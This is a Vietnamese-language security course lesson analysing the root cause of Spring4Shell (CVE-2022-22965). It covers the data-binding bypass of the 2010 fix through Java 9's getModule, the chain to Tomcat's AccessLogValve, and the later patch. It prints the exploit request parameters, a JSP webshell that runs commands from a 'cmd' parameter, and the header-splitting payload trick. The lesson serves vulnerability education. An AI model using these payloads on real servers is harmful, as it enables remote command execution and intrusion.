---
title: "14. Spring4Shell Part 1 — ClassLoader Theory & Root Cause"
tags: [security, cve, landmark-cves, spring4shell, spring, classloader, java, data-binding, lesson-14]
aliases: [Spring4Shell Part 1, CVE-2022-22965 Root Cause]
created: 2026-03-24
---

> **Prerequisites**: [[09-log4shell-root-cause|09. Log4Shell Part 1]], Java class hierarchy, Java 9 module system basics, Spring MVC basics
> **Objectives**:
> - Hiểu Spring MVC Data Binding và cơ chế `BeanWrapper` / `DataBinder`
> - Phân tích CVE-2010-1622 (tiền thân) và tại sao patch của nó bị bypass trong Java 9+
> - Hiểu Java 9 Module System — `getModule()` method và tại sao nó tạo attack path mới
> - Trace property chain `class.module.classLoader.resources.context.parent.pipeline.first.*`
> - Hiểu tại sao chain này cho phép ghi đè Tomcat AccessLogValve configuration
> - Nắm rõ điều kiện khai thác (WAR + JDK 9+ + Tomcat): tại sao Spring Boot JAR không bị ảnh hưởng

---

## Bối cảnh: Log4Shell's Sibling

Ngày 29/3/2022 — chưa đầy 4 tháng sau Log4Shell — một researcher công bố PoC cho lỗi RCE nghiêm trọng trong Spring Framework, Java framework phổ biến nhất thế giới. Cộng đồng bảo mật ngay lập tức so sánh với Log4Shell và đặt tên "Spring4Shell."

Nhưng hai lỗi này **hoàn toàn khác nhau về cơ chế**:
- Log4Shell: JNDI injection qua logging — một feature không ai ngờ là nguy hiểm
- Spring4Shell: data binding bypass → ClassLoader manipulation → write arbitrary files

Điều thú vị: Spring4Shell không phải lỗi hoàn toàn mới. Nó là **bypass của một patch cũ hơn 12 năm** — CVE-2010-1622 — mà Java 9 vô tình làm mất hiệu lực.

---

## Spring MVC Data Binding — Cơ Chế Nền

### Data Binding là gì?

Spring MVC có tính năng tự động map HTTP request parameters vào Java object (POJO). Developer không cần parse từng field thủ công:

```java
// Controller nhận POJO từ HTTP request
@RestController
public class UserController {

    @PostMapping("/register")
    public String register(User user) {
        // Spring tự động bind request params vào User object:
        // POST /register với body: name=Alice&email=alice@example.com
        // → user.getName() = "Alice"
        // → user.getEmail() = "alice@example.com"
        return "OK";
    }
}

// POJO được bind
public class User {
    private String name;
    private String email;
    // getters/setters
}
```

### BeanWrapper và PropertyDescriptor

Internally, Spring dùng `BeanWrapper` (implementation: `BeanWrapperImpl`) để set properties:

```java
// Spring Data Binding internals — simplified
BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(targetObject);

// Để set "user.name = Alice":
bw.setPropertyValue("name", "Alice");
// Gọi user.setName("Alice") qua reflection

// Để set nested property "user.address.city = Hanoi":
bw.setPropertyValue("address.city", "Hanoi");
// Gọi user.getAddress().setCity("Hanoi")
```

> [!definition] Definition 14.1 — Property Chaining trong BeanWrapper
> `BeanWrapper` hỗ trợ **nested property access** với dấu `.` separator. `address.city` có nghĩa: gọi `getAddress()` trên root object, rồi gọi `setCity()` trên result. Điều này cho phép bind deeply-nested properties từ HTTP parameter names.
>
> Vấn đề bắt đầu khi attacker có thể control property path này.

### Mọi Java Object đều có `class` property

Một POJO bình thường có các properties developer định nghĩa (`name`, `email`). Nhưng trong Java, **mọi object đều có method `getClass()`** — trả về `Class<?>` object của chính nó:

```java
User user = new User();
user.getClass();          // → Class<User>
user.getClass().getName() // → "com.example.User"
```

Điều này có nghĩa `BeanWrapper` có thể access `class` như một property của bất kỳ object nào:

```java
bw.setPropertyValue("class.something", value);
// → user.getClass().setSomething(value)  ← truy cập vào Class object!
```

---

## CVE-2010-1622 — Tiền Thân và Patch Cũ

### Lỗi năm 2010

CVE-2010-1622 là lỗi tương tự: attacker gửi parameter `class.classLoader.something` → Spring bind vào `getClass().getClassLoader().*` → có thể thao túng ClassLoader → RCE.

### Patch năm 2010

Spring fix bằng cách **denylist** một số property names trong `CachedIntrospectionResults`:

```java
// Spring Framework — CachedIntrospectionResults.java (sau patch 2010)
private static final Set<String> IGNORED_PROPERTY_NAMES =
    new HashSet<>(Arrays.asList("class", "classLoader", "protectionDomain"));

// Khi build PropertyDescriptor list:
for (PropertyDescriptor pd : beanInfo.getPropertyDescriptors()) {
    if (IGNORED_PROPERTY_NAMES.contains(pd.getName())) {
        continue;  // Skip "class", "classLoader", "protectionDomain"
    }
    // ... add to cache
}
```

Patch này **block trực tiếp** `class.classLoader` bằng cách loại property tên `classLoader` và `protectionDomain` khỏi danh sách accessible. Hiệu quả với Java 8.

---

## Java 9 Module System — Tại sao Patch bị Bypass

### Java 9 thêm `getModule()` vào `Class`

Java 9 giới thiệu Module System (Project Jigsaw). Một trong những thay đổi: **class `java.lang.Class` có thêm method `getModule()`** trả về `java.lang.Module` object.

```java
// Java 9+
user.getClass().getModule()        // → Module object
user.getClass().getModule().getName() // → tên module chứa class này
```

Đây là **public method mới** không tồn tại trong Java 8, và Spring's denylist năm 2010 không include `module`:

```java
// Denylist cũ chỉ có:
{"class", "classLoader", "protectionDomain"}
// Không có "module"!
```

Vì vậy Spring **cho phép** access path `class.module.*` — mở ra attack surface mới.

### Attack Path qua `class.module.classLoader`

```java
// Attacker gửi parameter:
// class.module.classLoader.SOMETHING = value

// Spring DataBinder:
user.getClass()           // Class<User>
    .getModule()          // Module object (Java 9+)
    .getClassLoader()     // ClassLoader instance
    .SOMETHING = value    // manipulate ClassLoader!
```

`ClassLoader.getClassLoader()` không bị denylist, nên path `class.module.classLoader` vượt qua protection của CVE-2010-1622 patch.

---

## ClassLoader → Tomcat AccessLogValve — The Full Chain

### Từ ClassLoader đến Tomcat internals

Khi ứng dụng chạy trên Apache Tomcat dưới dạng WAR file, ClassLoader là `WebappClassLoader` — một subclass của Tomcat's `URLClassLoader`. Nó có reference đến `WebappContext`, từ đó có thể reach toàn bộ Tomcat pipeline.

Full property chain:

```text
class
  .module                    → java.lang.Module (Java 9+)
  .classLoader               → WebappClassLoader (Tomcat's)
  .resources                 → WebResourceRoot
  .context                   → StandardContext (the web application)
  .parent                    → StandardHost (the virtual host)
  .pipeline                  → Pipeline
  .first                     → AccessLogValve (logging valve) ← TARGET
```

`AccessLogValve` là Tomcat component ghi access log. Nó có các properties có thể configure:

```java
// AccessLogValve settable properties:
valve.setPattern("%h %t %r %s %b");       // log pattern
valve.setSuffix(".log");                   // file suffix
valve.setDirectory("/var/log/tomcat");     // log directory
valve.setPrefix("localhost_access_log");   // file prefix
valve.setFileDateFormat("");               // date format in filename
```

> [!definition] Definition 14.2 — Tomcat Log File Write Primitive
> Bằng cách thao túng `AccessLogValve.pattern`, `directory`, `prefix`, `suffix`, và `fileDateFormat` qua Spring Data Binding, attacker có thể:
>
> 1. Set `directory = webapps/ROOT` (web root của Tomcat)
> 2. Set `prefix = shell` và `suffix = .jsp` → log file = `shell.jsp`
> 3. Set `fileDateFormat = ` (empty) → không thêm date vào filename
> 4. Set `pattern = <JSP webshell code>` → log file content = JSP code
>
> Kết quả: mỗi HTTP request đến server sẽ được ghi vào `webapps/ROOT/shell.jsp` — một JSP webshell! Sau một vài requests, file `shell.jsp` tồn tại và có thể truy cập qua HTTP.

---

## HTTP Request Structure — Exploit Parameters

Exploit gồm **một chuỗi POST requests** để set từng AccessLogValve property:

```http
POST /vuln-app/endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=WEBSHELL_CONTENT
&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

Với `WEBSHELL_CONTENT` là JSP webshell:

```java
// JSP webshell content (URL-encoded trong actual request)
<%
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
int a = -1;
byte[] b = new byte[2048];
while((a=in.read(b))!=-1){ out.println(new String(b, 0, a)); }
%>
```

Nhưng không thể ghi toàn bộ JSP code vào một request trực tiếp vì kết quả log sẽ lẫn với HTTP request headers. Thực tế dùng technique "split payload qua multiple headers":

```http
prefix: <%
suffix: %>
c: Runtime
pattern: %{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); ...%{suffix}i
```

Tomcat Access Log Pattern dùng `%{header_name}i` để include HTTP header value trong log line. Nên attacker set:
- Header `prefix: <%` → `%{prefix}i` trong pattern = `<%`
- Header `suffix: %>` → `%{suffix}i` = `%>`
- Header `c: Runtime` → `%{c}i` = `Runtime`

Kết quả log line = valid JSP code!

---

## Điều Kiện Khai Thác — Rất Cụ Thể

Không phải mọi Spring app đều vulnerable. Cần tất cả các điều kiện sau:

```text
✓ JDK 9 trở lên
✓ Apache Tomcat làm servlet container
✓ Deployed dưới dạng WAR file (không phải executable JAR)
✓ Spring Framework 5.3.0–5.3.17, hoặc 5.2.0–5.2.19
✓ Endpoint nhận POJO binding (không dùng @RequestBody)
✓ Endpoint accessible (không require auth, hoặc attacker có credentials)
```

**Tại sao Spring Boot JAR không vulnerable?**

Spring Boot executable JAR không dùng external Tomcat — nó bundle Tomcat embedded. Embedded Tomcat không có `WebappClassLoader` theo cách traditional, và classpath structure khác → property chain không reach được `AccessLogValve` theo cùng cách.

WAR deployed trên standalone Tomcat mới có full Tomcat class hierarchy trong classpath.

---

## Patch Analysis — Hai Lớp Fix

Spring Framework fix bằng hai thay đổi bổ sung vào denylist:

```java
// Spring 5.3.18 — CachedIntrospectionResults.java (sau patch)
// Thêm "classLoader" type check
for (PropertyDescriptor pd : beanInfo.getPropertyDescriptors()) {
    if (pd.getPropertyType() != null) {
        // FIX 1: Block bất kỳ property nào có type ClassLoader
        if (ClassLoader.class.isAssignableFrom(pd.getPropertyType())) {
            continue;
        }
        // FIX 2: Block bất kỳ property nào có type ProtectionDomain
        if (ProtectionDomain.class.isAssignableFrom(pd.getPropertyType())) {
            continue;
        }
    }
    // ... add to cache nếu pass
}
```

Thay vì chỉ denylist theo **tên** property (`"classLoader"`, `"class"`), patch mới denylist theo **type** — bất kỳ property nào có return type là `ClassLoader` hoặc `ProtectionDomain`, dù tên là gì.

Điều này block cả path `class.module.classLoader` vì `getClassLoader()` trả về `ClassLoader` type.

Apache Tomcat cũng tự fix ở phía mình bằng cách thêm validation trong `BeanWrapper` không cho set Tomcat internal classes qua `classLoader` parameter.

---

## Phân Biệt Với CVE-2010-1622

| Đặc điểm | CVE-2010-1622 | CVE-2022-22965 |
|---------|--------------|---------------|
| Java version | Java ≤ 8 | Java ≥ 9 |
| Attack path | `class.classLoader.*` | `class.module.classLoader.*` |
| Tại sao bypass | Không bypass — đây là lỗi gốc | Bypass patch cũ via Java 9's `getModule()` |
| Impact | ClassLoader manipulation | ClassLoader → Tomcat AccessLogValve → file write |
| Fix 2010 | Denylist by name: "classLoader" | Không đủ — không cover "module" |
| Fix 2022 | Denylist by type: ClassLoader.class | Cover tất cả paths trả về ClassLoader |

---

## Summary

- Spring MVC Data Binding auto-map HTTP params vào POJO qua `BeanWrapper` / nested property access
- Mọi Java object có `getClass()` → access `Class` object với properties
- CVE-2010-1622 (2010): Spring denylist `classLoader` và `protectionDomain` by name
- Java 9 thêm `getModule()` vào `Class` — không trong denylist → path `class.module.classLoader.*` mở ra
- `class.module.classLoader.resources.context.parent.pipeline.first` → Tomcat `AccessLogValve`
- Attacker set `directory`, `prefix`, `suffix`, `pattern` của AccessLogValve → write arbitrary file vào webroot
- Điều kiện: JDK 9+, Tomcat WAR deployment, Spring 5.3.0–5.3.17, POJO binding endpoint
- Fix: denylist by ClassLoader type (không phải by name) — cover all future paths
- [[15-spring4shell-exploit|Bài tiếp theo]]: exploit chain đầy đủ, JSP webshell delivery, PoC Python

---

## References

- VMware/Spring official disclosure: https://spring.io/security/cve-2022-22965
- Kudelski deep understanding: https://research.kudelskisecurity.com/2022/04/05/spring4shell-a-deep-understanding-cve-2022-22965/
- Trend Micro Mirai botnet exploitation: https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html
- Pentest-Tools manual exploit: https://pentest-tools.com/blog/detect-exploit-spring4shell-cve-2022-22965
- Securelist technical breakdown: https://securelist.com/spring4shell-cve-2022-22965/106239/
- CVE-2010-1622 original: https://nvd.nist.gov/vuln/detail/CVE-2010-1622
